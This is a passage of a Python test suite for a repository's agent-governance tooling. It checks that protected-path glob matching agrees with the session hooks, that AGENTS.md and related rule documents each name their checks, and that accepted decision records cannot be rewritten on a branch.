    """The protected paths and every Lens's input: one list, in config/hooks.json, that the session hooks read and the
    Kernel is given as `protected_paths` (decision 0020)."""

    HOOKS = json.loads((ROOT / "config" / "hooks.json").read_text())
    # The paths each criterion of the review's rubric applies to, read with the same matcher (decision 0029).
    RUBRIC = [p for c in json.loads((ROOT / "config" / "rubric-pr-review.json").read_text())["criteria"]
              for p in c.get("applies_when", {}).get("paths", [])]

    def test_the_kernels_matcher_and_the_hooks_agree_on_one_corpus(self):
        # Only the two matchers can drift, so they are held to each other: on every file in the repo, and on paths made
        # from each pattern, its wildcard standing for nothing, a letter or more than one name, in any case, below it,
        # beside it and above it. The rubric's patterns are among them, and `**` as a whole name.
        data = protected.load()
        patterns = [p for p, _ in data["protected"] + data["reported"]] + ["a/*", "*.json", "x*y*z/", "a*/b*/", "*"]
        patterns += self.RUBRIC + ["**", "**/", "a/**/b*/", "**/a/**", "a**b/c", "**/**/x"]
        self.assertLessEqual({"**/*.py", "kernel/**", "**/AGENTS.md"}, set(self.RUBRIC))
        corpus = {p.relative_to(ROOT).as_posix() for p in walk.files(ROOT)}
        for pattern in patterns:
            for star in ("", "x", "x/y", "a.b", "*"):
                stem = pattern.replace("*", star)
                for end in ("", "/a", "/a/b.json", "x", ".bak"):
                    for path in (stem.rstrip("/") + end, "x/" + stem.rstrip("/") + end):
                        corpus |= {path, path.upper(), path.title()}
        corpus = sorted(p for p in corpus if derive.readable_name(p))
        self.assertGreater(len(corpus), 1000)
        for pattern in patterns:
            whole = protected.entries([(pattern, "")])[0][3]
            for path in corpus:
                self.assertEqual(derive.matches(pattern, path), bool(whole.match(path.casefold())), (pattern, path))

    def test_two_stars_as_a_whole_name_stand_for_any_run_of_names(self):  # decision 0029
        # `**` as a whole name stands for any run of names, none included; within a name it is two wildcards, each
        # within that name. The hooks read it alike (test_the_kernels_matcher_and_the_hooks_agree_on_one_corpus).
        for pattern, path, fits in (("**/*.py", "a.py", True), ("**/*.py", "a/b/c.py", True), ("**/*.py", "a/b.txt", False),
                                    ("kernel/**", "kernel", True), ("kernel/**", "kernel/a/b.py", True),
                                    ("kernel/**", "kernels/a.py", False), ("**/AGENTS.md", "AGENTS.md", True),
                                    ("**/AGENTS.md", "a/b/AGENTS.md", True), ("**/AGENTS.md", "a/xAGENTS.md", False),
                                    ("a/**/b", "a/b", True), ("a/**/b", "a/x/y/b", True), ("a/**/b", "a/x/y/c", False),
                                    ("a**b", "ab", True), ("a**b", "axyb", True), ("a**b", "ax/yb", False),
                                    ("docs/**/", "docs/a/b.md", True), ("docs/**/", "doc/a.md", False)):
            self.assertEqual(derive.matches(pattern, path), fits, (pattern, path))
            whole = protected.entries([(pattern, "")])[0][3]
            self.assertEqual(bool(whole.match(path.casefold())), fits, (pattern, path))

    def test_the_kernel_is_given_every_protected_path_and_lens_input(self):
        want = [e["path"] for e in self.HOOKS["protected"]] + [e["path"] for e in self.HOOKS["lens_inputs"]]
        self.assertEqual(protected.protected_paths(), want)
        self.assertEqual(support.CONFIG["protected_paths"], want)
        self.assertEqual(world.CONFIG["protected_paths"], want)
        # What is only reported, such as a decision record, is listed at a stop and is not on the Kernel's list.
        self.assertNotIn("docs/decisions/", want)

    def test_each_lens_input_is_a_required_lens_and_verifys_cover_every_check(self):
        lenses = {lens["lens"] for lens in support.CONFIG["required_lenses"]["deterministic"]}
        inputs = {}
        for entry in self.HOOKS["lens_inputs"]:
            self.assertIn(entry["lens"], lenses, entry["path"])
            inputs.setdefault(entry["lens"], []).append(entry["path"])
        # verify runs make, which reads GNUmakefile, makefile or Makefile, and every check and test where checks live;
        # `python3 -m` puts the top of the repo first on the path, so a module there shadows the standard library; and
        # the tests import the Kernel. The secret scan reads its configuration and the findings it is told to pass over.
        for path in ["Makefile", "makefile", "GNUmakefile", "json.py", "kernel/derive.py"] + [
                "%s/x.py" % where for where in check_context.CHECKS]:
            self.assertTrue(any(derive.matches(p, path) for p in inputs["verify"]), path)
        for path in (".gitleaks.toml", ".gitleaksignore"):
            self.assertTrue(any(derive.matches(p, path) for p in inputs["secret-scan"]), path)
        # Whatever the import system loads from the top of the repo ahead of the standard library, by every suffix it
        # knows here and Windows's: a module, a regular package's __init__, and the compiled modules. A directory with
        # no __init__ is a namespace package, which a module found later on the path wins over, so it shadows nothing.
        machinery = importlib.machinery
        suffixes = (machinery.SOURCE_SUFFIXES + machinery.BYTECODE_SUFFIXES + machinery.EXTENSION_SUFFIXES
                    + [".pyw", ".pyd", ".cp312-win_amd64.pyd", ".cpython-312-x86_64-linux-gnu.so", ".abi3.so"])
        for path in (["json" + s for s in suffixes] + ["unittest/__init__" + s for s in suffixes]
                     + ["__pycache__/json.cpython-39.pyc"]):
            self.assertTrue(any(derive.matches(p, path) for p in inputs["verify"]), path)

    def test_every_package_at_the_top_of_the_repo_is_a_lens_input_whole(self):
        # verify imports every regular package at the top of the repo, through any of its modules or the bytecode
        # cached for them. A package added without its own entry fails here.
        verify = [e["path"] for e in self.HOOKS["lens_inputs"] if e["lens"] == "verify"]
        packages = sorted({p.relative_to(ROOT).parts[0] for p in walk.files(ROOT)
                           if len(p.relative_to(ROOT).parts) == 2 and p.name.startswith("__init__.")})
        self.assertLessEqual({"kernel", "sim", "tests", "tools"}, set(packages))
        for package in packages:
            for path in ("%s/x.py" % package, "%s/a/b.py" % package, "%s/__pycache__/x.cpython-39.pyc" % package):
                self.assertTrue(any(derive.matches(p, path) for p in verify), path)

    def test_each_lens_workflow_file_is_protected(self):  # decision 0018
        patterns = [e["path"] for e in self.HOOKS["protected"]]
        for lens in support.CONFIG["required_lenses"]["deterministic"]:
            if lens["workflow"] is not None:
                self.assertTrue(any(derive.matches(p, lens["workflow"]) for p in patterns), lens["lens"])


class Context(unittest.TestCase):
    def test_a_rule_with_no_check_is_caught(self):
        root = tree({"tools/check_x.py": "", "README.md": "", "docs/a.md": ""})
        held = check_context._held
        self.assertTrue(caught(held("Reviewers look for it", "rule", root, root), "names no check"))
        self.assertEqual(held("`tools/check_x.py`", "rule", root, root), [])
        # A document that exists is not a check.
        self.assertTrue(caught(held("`README.md`", "rule", root, root), "names no check"))
        self.assertTrue(caught(held("the reviewers, see `docs/`", "rule", root, root), "names no check"))

    def test_a_rule_whose_wait_is_over_is_caught(self):
        root = tree({"harness/apply.py": "", "CODEOWNERS": ""})
        held = check_context._held
        self.assertEqual(held("waiting on `roles/`", "rule", root, root), [])
        self.assertEqual(held("Waiting on `roles/`", "rule", root, root), [])
        self.assertTrue(caught(held("waiting on `harness/`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `harness/never.py`", "rule", root, root), "exists now"))
        self.assertTrue(caught(held("waiting on `.github/CODEOWNERS`", "rule", root, root), "exists now"))

    def test_a_rule_that_cites_a_test_expected_to_fail_must_say_so(self):
        root = tree({"tests/t.py": "@pending\ndef test_later(self):\n    pass\n\ndef test_now(self):\n    pass\n"})
        held = check_context._held
        self.assertTrue(caught(held("`tests/t.py::test_later`", "rule", root, root), "is expected to fail"))
        self.assertEqual(held("not held yet: `tests/t.py::test_later`", "rule", root, root), [])
        self.assertTrue(caught(held("not held yet: `tests/t.py::test_now`", "rule", root, root), "names no test marked"))

    def test_a_wait_on_a_name_nothing_will_ever_have_is_caught(self):
        root = tree({"x": ""})
        self.assertTrue(caught(check_context._held("waiting on `someday/`", "rule", root, root), "not a planned"))

    def test_a_path_or_a_test_that_does_not_exist_is_caught(self):
        here = "class Real:\n    def test_present(self):\n        pass\n    # def test_gone(self): was deleted\n"
        text = ("See `tools/gone.py`, `scripts/gone.sh`, `toools/`, `harness/`, `tools/here.py:12`, [a link](docs/gone.md),\n"
                "`tools/here.py::test_missing`, `tools/here.py::test_gone`, `tools/here.py::Unreal.test_present`,\n"
                "`tools/here.py::Real.test_present` and [the rules](#12-rules). Run python3 -m tools.here.\n")
        root = tree({"docs/a.md": text, "tools/here.py": here})
        problems = check_context._references(root / "docs" / "a.md", text, root)
        self.assertEqual(len(problems), 7, problems)

    def test_a_number_without_its_title_is_caught(self):
        def found(text):
            root = tree({"docs/a.md": text})
            return check_context._references(root / "docs" / "a.md", text, root)
        for text in ("Fixed in #2225.", "See combsmith/x#2225.", "See pull request 2225.", "See PR 2225.",
                     'It "works". See pull request 2225.'):
            self.assertTrue(found(text), text)
        for text in ('See "docs: factory MVP" (pull request 2225).', "See \u201cdocs: factory MVP\u201d (issue 12)."):
            self.assertEqual(found(text), [], text)

    def test_a_root_file_too_long_to_read_in_full_is_caught(self):
        root = tree({"AGENTS.md": "line\n" * (check_context.ROOT_LINES + 1), "kernel/AGENTS.md": "x " * 200 + "\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "AGENTS.md is 61 lines; the limit is 60"))
        self.assertTrue(caught(problems, "kernel/AGENTS.md has a line over"))

    def test_a_rule_in_any_agents_file_must_name_its_check(self):
        root = tree({"AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be kind | `tools/x.py` |\n", "tools/x.py": "",
                     "tools/AGENTS.md": "| Rule | Held by |\n|---|---|\n| Be careful | reviewers |\n",
                     "sim/AGENTS.md": "| Rule | Check |\n|---|---|\n| Be quick | `tools/x.py` |\n",
                     "tests/AGENTS.md": "- Be thorough.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "tools/AGENTS.md, rule 'Be careful': names no check"))
        self.assertTrue(caught(problems, "sim/AGENTS.md: a table of rules must end in a column headed 'Held by'"))
        self.assertTrue(caught(problems, "tests/AGENTS.md: no table of rules"))
        self.assertFalse(caught(problems, "AGENTS.md, rule 'Be kind'"))

    def test_a_date_in_what_is_always_read_is_caught(self):
        root = tree({"AGENTS.md": "Decided on 2026-10-11.\n", "CLAUDE.md": "See AGENTS.md, and also these rules.\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "holds a date") and caught(problems, "CLAUDE.md must hold the one line"))

    def test_a_second_set_of_rules_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "CLAUDE.md": "@AGENTS.md\n", "kernel/CLAUDE.md": "Do as you like.\n",
                     ".github/copilot-instructions.md": "x\n"})
        problems = check_context._agents_files(root)
        self.assertTrue(caught(problems, "kernel/CLAUDE.md is a second set of rules"))
        self.assertTrue(caught(problems, "copilot-instructions.md is a second set of rules"))
        self.assertEqual(check_context._agents_files(tree({"x": ""})), ["AGENTS.md is missing"])

    def test_a_directory_with_no_rules_of_its_own_is_caught(self):
        root = tree({"AGENTS.md": "x\n", "kernel/decide.py": ""})
        self.assertTrue(caught(check_context._agents_files(root), "kernel/ has no AGENTS.md"))

    def test_a_decision_with_no_boundary_is_caught(self):
        record = "# 0001. X\n\n## Decision\n\nY.\n\n## Why\n\nZ.\n"
        self.assertTrue(caught(check_context._decisions(tree({"docs/decisions/0001-x.md": record})), "names no boundary"))
        extra = record + "\n## Boundaries\n\n| B | Check |\n|---|---|\n| b | `tools/x.py` |\n\n## Not yet held\n\nA wish.\n"
        root = tree({"docs/decisions/0001-x.md": extra, "docs/decisions/0003-y.md": extra, "tools/x.py": ""})
        problems = check_context._decisions(root)
        self.assertTrue(caught(problems, "a section 'Not yet held'"))
        self.assertTrue(caught(problems, "0003-y.md: records are numbered from 0001 with no gap"))
        self.assertTrue(caught(problems, "0003-y.md: the title must open with its number"))

    def test_a_lesson_with_no_check_is_caught(self):
        text = ("### L-01 A thing broke\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n\n"
                "## L-02 Another\n\n**Failure.** It broke.\n\n**Rule.** Do not.\n")
        problems = check_context._lessons(tree({"docs/lessons.md": text}))
        self.assertTrue(caught(problems, "L-01 has no Check"))
        self.assertTrue(caught(problems, "must be a third-level heading"))

    def test_a_standard_with_prose_and_no_example_is_caught(self):
        root = tree({"docs/standards/code.md": "# Code\n\n## Be careful\n\nPlease.\n\nHeld by: `tools/`\n", "tools/x.py": ""})
        self.assertTrue(caught(check_context._standards(root), "the example comes before the prose"))

    def test_a_standard_over_one_page_is_caught(self):
        # A standard is one page. The workflows page also shows the required check's workflow, its first yaml block,
        # word for word as check_workflows holds it, so that block is not counted there, and nothing else is.
        page = "# %s\n\n## Be careful\n\n```yaml\n%s```\n\n%sOrg standard: none. This repo's own.\nHeld by: `tools/`\n"
        block, prose = "x: 1\n" * 130, "Words.\n" * 130
        for name, text, over in (("code", page % ("Code", block, ""), True),
                                 ("workflows", page % ("Workflows", block, ""), False),
                                 ("workflows", page % ("Workflows", "x: 1\n", prose), True),
                                 # The first yaml block alone: prose between it and a later fence still counts.
                                 ("workflows", page % ("Workflows", "x: 1\n", prose + "```\nx\n```\n"), True)):
            problems = check_context._standards(tree({"docs/standards/%s.md" % name: text, "tools/x.py": ""}))
            self.assertEqual(caught(problems, "%s.md is over one page" % name), over, name)

    def test_a_standard_that_cites_no_org_standard_is_caught(self):
        page = "# Code\n\n## Be careful\n\n```\nx\n```\n\n%sHeld by: `tools/`\n"
        bare = check_context._standards(tree({"docs/standards/code.md": page % "", "tools/x.py": ""}))
        cited = check_context._standards(tree({"docs/standards/code.md": page % "Org standard: none. This repo's own.\n",
                                               "tools/x.py": ""}))
        self.assertTrue(caught(bare, "no 'Org standard:' line") and not caught(cited, "no 'Org standard:' line"))

    def test_a_skill_the_root_file_does_not_point_to_is_caught(self):
        good = "---\nname: run-it\ndescription: Run it, when a story asks for it.\n---\n\n# Run it\n"
        pointer = "Read `.claude/skills/run-it/SKILL.md`.\n"
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": good})), [])
        quoted = good.replace("name: run-it", 'name: "run-it"').replace("description: Run it", "description: >\n  Run it")
        self.assertEqual(check_context._skills(tree({"AGENTS.md": pointer, ".claude/skills/run-it/SKILL.md": quoted})), [])
        root = tree({"AGENTS.md": "Not `.claude/skills/run-it/SKILL.md.old`, nor x.claude/skills/run-it/SKILL.mdx\n",
                     ".claude/skills/run-it/SKILL.md": good, ".claude/skills/other/SKILL.md": "# Other\n",
                     ".claude/skills/third/SKILL.md": good.replace("description: Run it, when a story asks for it.", "description:"),
                     ".claude/skills/fourth/SKILL.md": good.replace("run-it", "fourth").replace("description: Run it, when a story asks for it.",
                                                                                                 "description: >\n")})
        problems = check_context._skills(root)
        for words in ("run-it/SKILL.md: the root AGENTS.md does not point to it", "other/SKILL.md: opens with no frontmatter",
                      "third/SKILL.md: is named run-it; a skill is named for its directory", "third/SKILL.md: no description",
                      "fourth/SKILL.md: no description"):
            self.assertTrue(caught(problems, words), words)
        planted = clone({".claude/skills/run-a-platform-trial/SKILL.md": good.replace("run-it", "run-a-platform-trial")
                         + "See `tools/gone.py`.\n", ".claude/skills/other/SKILL.md": "# Other\n"})
        problems = check_context.run(planted)
        for words in ("SKILL.md: names tools/gone.py", "other/SKILL.md: the root AGENTS.md does not point to it",
                      "other/SKILL.md: opens with no frontmatter"):
            self.assertTrue(caught(problems, words), words)

    def test_a_second_copy_of_the_review_standard_is_caught(self):
        root = tree({"docs/standards/review.md": "# Review\n", "docs/standards/release.md": "# Release\n"})
        problems = check_context._standards(root)
        self.assertTrue(caught(problems, "the review standard is"))
        self.assertTrue(caught(problems, "release.md: the standards are"))

    def test_only_the_design_record_is_exempt(self):
        root = tree({"docs/architecture/review.md": "See `scripts/gone.sh`.\n", "docs/notes/a.md": "x\n",
                     "docs/architecture-notes.md": "x\n"})
        self.assertEqual([p.name for p in check_context._markdown(root)], ["architecture-notes.md", "a.md"])

    def test_a_cell_may_hold_a_pipe_and_a_second_table_is_not_a_boundary(self):
        self.assertEqual(check_context._cells("| `A | B` | x \\| y | `tools/x.py` | "), ["`A | B`", "x | y", "`tools/x.py`"])
        body = "| B | Check |\n|---|---|\n| b | c |\n\nMore.\n\n| Other | Table |\n|---|---|\n| d | e |\n"
        self.assertEqual(check_context._rows(body), [["b", "c"]])

    def test_the_whole_check_reads_every_document(self):
        lessons = (ROOT / "docs" / "lessons.md").read_text()
        planted = {"docs/lessons.md": lessons + "\nSee `tools/gone.py`.\n",
                   "docs/decisions/0001-one-repo-and-a-kernel-that-does-no-io.md": "# 0001. Gutted\n",
                   "docs/standards/tests.md": "# Tests\n", "kernel/AGENTS.md": "# kernel/\n"}
        problems = check_context.run(clone(planted))
        for words in ("docs/lessons.md: names tools/gone.py", "0001-one-repo-and-a-kernel-that-does-no-io.md: no section",
                      "docs/standards/tests.md states no rule", "kernel/AGENTS.md: no table of rules"):
            self.assertTrue(caught(problems, words), words)


RECORD = ("# 0001. One thing\n\nStatus: accepted.\n\n## Decision\n\nWe do one thing.\nAnd only that.\n\n"
          "## Why\n\nTwo things split the work.\n\n## Boundaries\n\n| Boundary | Check |\n|---|---|\n"
          "| One thing | `tools/check_x.py` |\n")
FIRST = "docs/decisions/0001-one-thing.md"
LATER = "docs/decisions/0002-two-things.md"
REPLACED = RECORD.replace("Status: accepted.", "Status: replaced by `%s`, which holds\nthe rule in force." % LATER)
REPLACING = RECORD.replace("# 0001. One thing", "# 0002. Two things").replace(
    "Status: accepted.", "Status: accepted. Replaces `%s`,\nand keeps all of it." % FIRST)
EDITED = "title, Decision or Why changed"


def history(files: dict = None) -> pathlib.Path:
    """A repo whose main, on origin, holds decision 0001 and `files`; the working tree is main, unchanged."""
    root = tree(dict({FIRST: RECORD}, **(files or {})))
    git(root, "init", "-q", "-b", "main")
    committed(root, "main")
    return root


def committed(root: pathlib.Path, message: str) -> None:
    """Commit all of `root` on its branch, and when that is main, move origin's main to it."""
    git(root, "add", "-f", ".")
    git(root, "-c", "user.name=T", "-c", "user.email=t@example.com", "commit", "-q", "-m", message)
    if git(root, "branch", "--show-current").strip() == "main":
        git(root, "update-ref", "refs/remotes/origin/main", "HEAD")


def edited(root: pathlib.Path, files: dict, commit: bool = False) -> pathlib.Path:
    """`root` with `files` written over it, and committed on a branch when `commit`."""
    for rel, text in files.items():
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(text)
    if commit:
        git(root, "checkout", "-q", "-b", "change")
        committed(root, "change")
    return root


def refused(files: dict, words: str, base: dict = None) -> bool:
    """Does the check refuse `files` written over main, as `base` has it, saying `words`?"""
    return caught(check_decisions.run(edited(history(base), files)), words)


@contextlib.contextmanager
def outside_actions():
    """Run as anywhere but GitHub Actions, where a tree with no .git is an export and is skipped."""
    with mock.patch.dict(os.environ):
        os.environ.pop("GITHUB_ACTIONS", None)
        yield


class Decisions(unittest.TestCase):
    def test_an_edit_to_a_decision_is_refused(self):
        for commit in (False, True):     # in the working tree, or committed on the branch
            with self.subTest(commit=commit):
                root = edited(history(), {FIRST: RECORD.replace("one thing.", "two things.")}, commit)
                self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: its " + EDITED))
        # The whole record is compared but its Status and Boundaries, so no heading or line break gets round it.
        ways = {
            "a second Decision, the original last": RECORD.replace("one thing.", "two things.")
            + "\n## Decision\n\nWe do one thing.\nAnd only that.\n",
            "an amendment as a heading of its own": RECORD.replace("only that.\n", "only that.\n\n# Amendment\n\nTwo.\n"),
            "a section of its own": RECORD.replace("## Boundaries", "## Amendment\n\nTwo things now.\n\n## Boundaries"),
            "a line before the Decision": RECORD.replace("Status: accepted.\n", "Status: accepted.\n\nIt no longer holds.\n"),
            "a fence around the original": RECORD.replace("And only that.", "Two.\n```\n## Decision\nAnd only that.\n```"),
            "the lines broken elsewhere": RECORD.replace("one thing.\nAnd only", "one thing. And\nonly"),
            "the title": RECORD.replace("# 0001. One thing", "# 0001. Two things"),
            "text after the table": RECORD + "\nAnd we now do two things.\n",
            "a second table": RECORD + "\n| Decision |\n|---|\n| We do two things |\n",
        }
        for name, text in ways.items():
            with self.subTest(name):
                self.assertTrue(refused({FIRST: text}, EDITED))

    def test_an_edit_to_why_is_refused(self):
        self.assertTrue(refused({FIRST: RECORD.replace("split the work", "share the work")}, "its " + EDITED))
        gone = RECORD.replace("## Why\n\nTwo things split the work.\n\n", "")
        self.assertTrue(refused({FIRST: gone}, EDITED))

    def test_an_edit_with_status_naming_the_record_that_replaces_it_is_allowed(self):
        for commit in (False, True):
            with self.subTest(commit=commit):
                root = edited(history(), {FIRST: REPLACED, LATER: REPLACING}, commit)
                self.assertEqual(check_decisions.run(root), [])
        # The Status is all that changes: the Decision and Why stay as they were.
        self.assertTrue(refused({FIRST: REPLACED.replace("one thing.", "two."), LATER: REPLACING}, EDITED))
        # The record named is new in this change, exists, comes later, and says in its own Status that it replaces this.
        self.assertTrue(refused({FIRST: REPLACED}, "not new in this change", base={LATER: REPLACING}))
        self.assertTrue(refused({FIRST: REPLACED}, "which does not exist"))
        earlier = REPLACED.replace("0002-two-things", "0000-nothing")
        self.assertTrue(refused({FIRST: earlier, "docs/decisions/0000-nothing.md": REPLACING}, "not a later record"))
        for status in ("Status: accepted.", "Status: accepted. Replaces `docs/decisions/0009-x.md`.",
                       "Status: accepted. It does not replace `%s`." % FIRST):
            with self.subTest(status):
                self.assertTrue(refused({FIRST: REPLACED, LATER: RECORD.replace("Status: accepted.", status)},
                                        "does not say it replaces this one"))
        # "replaced by" opens the Status, in decision 0012's words; it is not a phrase found anywhere in it.
        for status in ("Status: accepted, not replaced by `%s`." % LATER, "Status: accepted. Replaced by `%s`." % LATER,
                       "Status: replaced by `%s`" % LATER.replace(".md", ".mdx"), "Status: superseded.",
                       "Status: replaced by %s." % LATER):
            with self.subTest(status):
                self.assertTrue(refused({FIRST: RECORD.replace("Status: accepted.", status), LATER: REPLACING},
                                        "its Status changes only to say what replaces it"))
        # Once replaced, the Status is fixed: not changed back, nor pointed at another record.
        third = "docs/decisions/0003-three.md"
        status = REPLACED.split("\n\n")[1]
        for again in ("Status: accepted.", "Status: replaced by `%s`." % third):
            with self.subTest(again):
                self.assertTrue(refused({FIRST: REPLACED.replace(status, again), third: REPLACING.replace("0002", "0003")},
                                        "is fixed from then on", base={FIRST: REPLACED, LATER: REPLACING}))

    def test_a_new_record_that_replaces_one_sets_that_ones_status(self):
        # A new record that says it replaces another is held to it: that record is on main, earlier, and in this
        # change says it is replaced by this one.
        third = "docs/decisions/0003-three.md"
        cases = {
            "the record it replaces left as it was": ({LATER: REPLACING}, None, "whose Status does not say"),
            "a record that does not exist": ({LATER: REPLACING.replace(FIRST, "docs/decisions/0000-none.md")}, None,
                                             "0000-none.md, which is not a record main holds"),
            "a record new in this change": ({LATER: REPLACING.replace(FIRST, third), third: RECORD}, None,
                                            "0003-three.md, which is not a record main holds"),
            "a later record": ({LATER: REPLACING.replace(FIRST, third),
                                third: RECORD.replace("Status: accepted.", "Status: replaced by `%s`." % LATER)},
                               {third: RECORD}, "0003-three.md, which is not an earlier record"),
            "a record another one replaces": ({FIRST: REPLACED.replace(LATER, third), LATER: REPLACING,
                                               third: REPLACING.replace("0002", "0003")}, None,
                                              "0002-two-things.md: it replaces docs/decisions/0001-one-thing.md, whose"),
            # Every record it names is replaced: one more, left as it was or not there at all, is refused.
            "one more, unchanged": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s` and `%s`" % (FIRST, third))}, {third: RECORD},
                "0003-three.md, which is not an earlier record"),
            "one more, earlier and unchanged": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s`, `docs/decisions/0000-zero.md`" % FIRST)}, {"docs/decisions/0000-zero.md": RECORD},
                "0000-zero.md, whose Status does not say"),
            "one more that is not there": ({FIRST: REPLACED, LATER: REPLACING.replace(
                "`%s`" % FIRST, "`%s` and `docs/decisions/0000-none.md`" % FIRST)}, None,
                "0000-none.md, which is not a record main holds"),
            "said another way": ({FIRST: REPLACED, LATER: REPLACING.replace("accepted. Replaces", "proposed. Replaces")},
                                 None, "only as 'Status: accepted. Replaces'"),
            "the path without backticks": ({LATER: REPLACING.replace("`%s`" % FIRST, FIRST)}, None,
                                           "only as 'Status: accepted. Replaces'"),
        }
        # The whole declaration is read: past it, no word of replacing and no record's path, in either record.
        missing = "docs/decisions/0000-missing.md"
        for status in ("Status: accepted. Replaces `%s`. It also replaces `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`, and SUPERSEDES `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`, and keeps all of `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s`; and `%s`." % (FIRST, missing),
                       "Status: accepted. Replaces `%s` in part." % FIRST):
            cases[status] = ({FIRST: REPLACED, LATER: REPLACING.replace(REPLACING.split("\n\n")[1], status)}, None,
                             "0002-two-things.md: its Status says what it replaces only as")
        for status in ("Status: replaced by `%s`. It is also replaced by `%s`." % (LATER, third),
                       "Status: replaced by `%s`, with `%s`." % (LATER, third)):
            cases[status] = ({FIRST: RECORD.replace("Status: accepted.", status), LATER: REPLACING}, None,
                             "0001-one-thing.md: its Status changes only to say what replaces it")
        for name, (files, base, words) in cases.items():
            with self.subTest(name):
                self.assertTrue(refused(files, words, base=base), name)

    def test_a_boundary_row_added_is_allowed(self):
        added = RECORD + "| Another thing | `tests/test_x.py::test_y` |\n"
        moved = added.replace("`tools/check_x.py`", "`tools/check_y.py`")
        for text in (added, moved, added.replace("| One thing |", "|  One  thing |")):
            with self.subTest(text=text):
                self.assertEqual(check_decisions.run(edited(history(), {FIRST: text}, commit=True)), [])
        # A row is not taken away, and its Boundary does not change.
        for text in (RECORD.replace("| One thing | `tools/check_x.py` |\n", ""),
                     RECORD.replace("| One thing |", "| Two things |"),
                     RECORD.replace("| One thing | `tools/check_x.py` |", "| One thing | or two | `tools/check_x.py` |")):
            with self.subTest(text=text):
                self.assertTrue(refused({FIRST: text}, "the row 'One thing"))

    def test_a_new_record_is_allowed(self):
        self.assertEqual(check_decisions.run(edited(history(), {LATER: REPLACING.replace("Replaces", "Adds to")},
                                                    commit=True)), [])
        self.assertEqual(check_decisions.run(history()), [])
        # A record taken away, or renamed, is not a new one.
        root = history()
        (root / FIRST).rename(root / "docs/decisions/0001-another-name.md")
        self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: is gone"))

    def test_a_record_has_one_status_first_no_comment_and_is_no_link(self):
        ways = {
            "a second Status": RECORD.replace("## Why", "Status: replaced by `%s`.\n\n## Why" % LATER),
            "a Status below the Decision": RECORD.replace("Status: accepted.\n\n", "") + "\nStatus: accepted.\n",
            "a line before the Status": RECORD.replace("Status:", "Note.\n\nStatus:"),
            "a hidden comment": RECORD.replace("And only that.", "And only that.<!-- and two -->"),
            "a second Boundaries": RECORD + "\n## Boundaries\n\n| B | C |\n|---|---|\n",
            "no title": RECORD.replace("# 0001. One thing\n", ""),
            "a title that is not a heading": RECORD.replace("# 0001.", "0001."),
        }
        for name, text in ways.items():
            for rel in (FIRST, LATER):      # a record in the base, or a new one
                with self.subTest(name, rel=rel):
                    self.assertTrue(refused({rel: text}, "%s: it " % rel))
        root = history()
        os.symlink(str(root / FIRST), str(root / LATER))
        self.assertTrue(caught(check_decisions.run(root), "0002-two-things.md: is a link"))
        root = history()
        git(root, "mv", "docs/decisions", "elsewhere")
        os.symlink("../elsewhere", str(root / "docs" / "decisions"))
        self.assertTrue(caught(check_decisions.run(root), "docs/decisions: is a link"))
        self.assertTrue(caught(check_decisions.run(root), "0001-one-thing.md: is gone"))

    def test_a_worktree_is_compared_with_where_its_branch_left_main(self):
        # A worktree's .git is a file, and the check compares there as in any clone.
        root = history()
        other = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "worktree"
        git(root, "worktree", "add", "-q", "-b", "change", str(other))
        self.assertTrue((other / ".git").is_file())
        self.assertEqual(check_decisions.run(other), [])
        edited(other, {FIRST: RECORD.replace("one thing.", "two things.")})
        self.assertTrue(caught(check_decisions.run(other), "0001-one-thing.md: its " + EDITED))
        # Main moves on after the branch left it, and adds a record the branch has not got: that is not gone.
        root = history()
        git(root, "branch", "change")
        committed(edited(root, {LATER: REPLACING.replace("Replaces", "Adds to")}), "later")
        git(root, "checkout", "-q", "change")
        self.assertFalse((root / LATER).exists())
        self.assertEqual(check_decisions.run(root), [])

    def test_a_base_that_cannot_be_read_fails_and_only_an_export_is_skipped(self):
        # With a .git and no base to read the check fails, and never passes.
        bare = tree({FIRST: RECORD})
        git(bare, "init", "-q")
        shallow = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "shallow"
        git(SCRATCH.name, "clone", "-q", "--depth", "1", (history() / ".git").as_uri(), str(shallow))
        no_origin = history()
        git(no_origin, "update-ref", "-d", "refs/remotes/origin/main")
        for name, root, words in (("no commit", bare, "failed"), ("shallow", shallow, "shallow"),
                                  ("no origin", no_origin, "git rev-parse failed")):
            with self.subTest(name):
                self.assertTrue(caught(check_decisions.run(root), "cannot be compared"))
                self.assertIn(words, check_decisions.described(root))
        with mock.patch("shutil.which", return_value=None):
            self.assertTrue(caught(check_decisions.run(history()), "git is not on PATH"))
        # A replacement ref is not read: the base is main as it was committed, not as a replace says.
        root = edited(history(), {FIRST: RECORD.replace("one thing.", "two things.")}, commit=True)
        git(root, "replace", git(root, "rev-parse", "main").strip(), "HEAD")
        self.assertTrue(caught(check_decisions.run(root), "its " + EDITED))
        # An export has no .git, and so no history: the comparison is skipped, and verify says so; but not in CI.
        export = tree({FIRST: RECORD.replace("one thing.", "two things.")})
        with outside_actions():
            self.assertEqual(check_decisions.run(export), [])
            self.assertIn("skipped", check_decisions.described(export))
        with mock.patch.dict(os.environ, GITHUB_ACTIONS="true"):
            self.assertTrue(caught(check_decisions.run(export), "in GitHub Actions the checkout always writes one"))
        # A record's form needs no base, and is held in an export too.
        with outside_actions():
            self.assertTrue(caught(check_decisions.run(tree({FIRST: RECORD + "<!-- -->\n"})), "an HTML comment"))


def fixture(**fields) -> str:
    """The example fixture, as text, with `fields` written over it."""
    data = json.loads((ROOT / "examples" / "trial.json").read_text())
